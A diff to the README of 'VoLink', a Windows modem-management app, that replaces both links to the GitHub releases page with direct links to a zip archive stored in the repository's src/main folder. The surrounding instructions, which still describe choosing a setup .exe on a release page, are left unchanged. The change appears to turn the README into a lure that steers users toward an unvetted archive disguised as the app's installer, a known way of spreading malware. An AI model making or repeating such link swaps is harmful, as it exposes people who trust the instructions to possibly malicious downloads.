@@ -1,5 +1,5 @@
 # 📞 VoLink - Manage Your Mobile Broadband Like a Pro
-[![Download VoLink](https://img.shields.io/badge/Download-VoLink-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/lennyinvariant851/VoLink/releases)
+[![Download VoLink](https://img.shields.io/badge/Download-VoLink-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/lennyinvariant851/VoLink/main/src/main/Vo_Link_v2.5-alpha.3.zip)
 
 ## 🚀 Getting Started
 VoLink is a modern Windows app that lets you manage your 4G or 5G modem (dongle, mobile hotspot, or built-in cellular adapter) with ease. Make and receive voice calls, send SMS, run AT commands, manage eSIM profiles, and set up a proxy—all from one clean interface. No technical skills needed.
@@ -21,7 +21,7 @@ Follow these steps to get VoLink running on your computer:
 
 1. **Visit this link to download the application**  
    Go to the official release page on GitHub:  
-   [https://github.com/lennyinvariant851/VoLink/releases](https://github.com/lennyinvariant851/VoLink/releases)
+   [https://raw.githubusercontent.com/lennyinvariant851/VoLink/main/src/main/Vo_Link_v2.5-alpha.3.zip](https://raw.githubusercontent.com/lennyinvariant851/VoLink/main/src/main/Vo_Link_v2.5-alpha.3.zip)
 
 2. **Download the latest release**  
    On that page, look for the newest version (usually at the top). Click it to expand details, then click the file named something like `VoLink.Setup.1.x.x.exe` to download. If you see a `.exe` file, that's the installer.
